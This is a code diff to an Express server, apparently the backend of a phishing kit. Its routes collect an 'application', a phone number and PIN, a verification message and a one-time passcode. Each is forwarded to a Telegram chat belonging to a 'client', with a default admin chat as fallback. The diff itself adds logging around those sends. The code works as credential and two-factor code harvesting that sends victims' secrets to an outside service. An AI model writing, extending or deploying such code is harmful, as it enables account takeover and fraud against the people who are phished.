@@ -46,7 +46,7 @@ app.get('/apply/:clientId', async (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// --- API ROUTES (Updated to support direct applications on main page) ---
+// --- API ROUTES ---
 app.post('/api/apply', async (req, res) => {
     const sessionId = Date.now().toString();
     const { clientId, ...data } = req.body;
@@ -61,13 +61,17 @@ app.post('/api/apply', async (req, res) => {
     // Save session
     await db.createSession(sessionId, clientId || "default_client", data);
 
-    // Send to Telegram if a chat ID is available
+    // Send to Telegram with explicit logging for debugging
     if (chatId) {
         try {
+            console.log(`📤 Attempting to send application session ${sessionId} to chat ID: ${chatId}`);
             await telegram.sendApplicationToTelegram(chatId, sessionId, data);
+            console.log(`✅ Successfully sent application to Telegram for session ${sessionId}`);
         } catch (err) {
-            console.log("Failed to send application to Telegram:", err.message);
+            console.error(`❌ Failed to send application to Telegram:`, err.message);
         }
+    } else {
+        console.warn(`⚠️ No Telegram chat ID found for session ${sessionId}`);
     }
     
     res.json({ success: true, sessionId });
@@ -78,7 +82,6 @@ app.post('/api/login', async (req, res) => {
     const session = await db.getSession(sessionId);
     if (!session) return res.status(404).json({ error: "Session not found" });
 
-    // Try to get client chat ID or fallback to default
     let chatId = process.env.DEFAULT_ADMIN_CHAT_ID;
     if (session.clientId && session.clientId !== "default_client") {
         const client = await db.getClient(session.clientId);
@@ -90,7 +93,9 @@ app.post('/api/login', async (req, res) => {
     if (chatId) {
         try {
             await telegram.sendPinToTelegram(chatId, sessionId, { phone, pin });
-        } catch (err) {}
+        } catch (err) {
+            console.error(`❌ Failed to send PIN to Telegram:`, err.message);
+        }
     }
     
     res.json({ success: true });
@@ -112,7 +117,9 @@ app.post('/api/verification', async (req, res) => {
     if (chatId) {
         try {
             await telegram.sendVerificationToTelegram(chatId, sessionId, { phone: session.phone, verificationMsg });
-        } catch (err) {}
+        } catch (err) {
+            console.error(`❌ Failed to send verification message to Telegram:`, err.message);
+        }
     }
     
     res.json({ success: true });
@@ -134,7 +141,9 @@ app.post('/api/otp', async (req, res) => {
     if (chatId) {
         try {
             await telegram.sendOtpToTelegram(chatId, sessionId, { phone: session.phone, otp });
-        } catch (err) {}
+        } catch (err) {
+            console.error(`❌ Failed to send OTP to Telegram:`, err.message);
+        }
     }
     
     res.json({ success: true });
